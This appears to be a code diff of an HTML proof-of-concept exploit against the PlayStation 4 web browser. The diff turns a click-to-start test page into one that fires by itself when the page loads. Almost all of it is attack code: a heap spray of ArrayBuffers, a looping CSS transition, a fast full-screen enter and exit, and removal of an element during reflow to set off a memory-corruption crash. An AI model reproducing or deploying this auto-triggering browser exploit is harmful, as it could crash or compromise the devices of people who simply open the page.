@@ -1,84 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PS4 Full-Screen Crash (Stable)</title>
+  <title>PS4 Full-Screen Crash (Auto-Trigger)</title>
   <style>
-    #box {
-      width: 100px; height: 100px;
-      background: red;
-      transition: transform 0.5s linear;
-      position: absolute;
-      left: 0; top: 50%;
-    }
-    #status {
-      font-family: Arial;
-      color: white;
-      background: black;
-      padding: 10px;
-      position: fixed;
-      top: 0;
-      left: 0;
-      z-index: 9999;
-    }
-    #btn {
-      padding: 10px;
-      font-size: 20px;
-      position: fixed;
-      bottom: 20px;
-      left: 20px;
-      z-index: 10000;
+    #box { 
+      width: 100px; height: 100px; 
+      background: red; 
+      transition: transform 0.5s linear; 
+      position: absolute; 
+      left: 0; top: 50%; 
     }
   </style>
 </head>
 <body style="background: #000; height: 200vh;">
   <div id="box"></div>
-  <div id="status">[1] CLICK "START" BELOW</div>
-  <button id="btn">START TEST</button>
-
   <script>
     const box = document.getElementById('box');
-    const status = document.getElementById('status');
-    const btn = document.getElementById('btn');
 
-    // Lightweight heap spray (no hang)
+    // Heap spray to control memory layout
     function heapSpray() {
       window.spray = [];
-      for (let i = 0; i < 200; i++) { // Reduced from 1000 to 200
-        window.spray.push(new ArrayBuffer(0x1000));
+      for (let i = 0; i < 1000; i++) {
+        window.spray.push(new ArrayBuffer(0x1000)); // Smaller chunks for finer control
       }
-    }
-
-    // Start transition loop
-    function startTransition() {
-      box.style.transform = 'translateX(0)';
-      setTimeout(() => box.style.transform = 'translateX(300px)', 10);
     }
 
     // Main exploit
     function triggerExploit() {
       heapSpray();
-      status.textContent = "[2] TRANSITION RUNNING... WAIT FOR 'CRASH NOW!'";
       
-      // Loop transition every 1 second
-      setInterval(startTransition, 1000);
+      // Start transition loop
+      setInterval(() => {
+        box.style.transform = 'translateX(0)';
+        setTimeout(() => box.style.transform = 'translateX(300px)', 10);
+      }, 1000);
 
-      // Enable full-screen button after delay
+      // Enter full-screen after a delay
       setTimeout(() => {
-        btn.textContent = "ENTER FULL-SCREEN NOW";
-        btn.onclick = () => {
-          document.documentElement.requestFullscreen()
-            .then(() => {
-              status.textContent = "[3] CRASH NOW! EXIT FULL-SCREEN!";
-            })
-            .catch(e => {
-              status.textContent = "FULLSCREEN FAILED (DO IT MANUALLY)";
-            });
-        };
-      }, 2000); // Wait 2 secs before allowing full-screen
+        document.documentElement.requestFullscreen()
+          .then(() => {
+            // Exit full-screen immediately (critical timing!)
+            setTimeout(() => {
+              document.exitFullscreen(); 
+              // Trigger crash during transition
+              setTimeout(() => {
+                box.remove();
+                document.body.offsetHeight; // Force reflow
+              }, 50); // Adjust this delay for precision
+            }, 100); // Exit full-screen delay
+          })
+          .catch(e => console.error("Fullscreen failed:", e));
+      }, 2000); // Initial delay before full-screen
     }
 
-    // Start on button click
-    btn.addEventListener('click', triggerExploit, { once: true });
+    // Start automatically (if PS4 browser allows)
+    setTimeout(triggerExploit, 1000);
   </script>
 </body>
 </html>
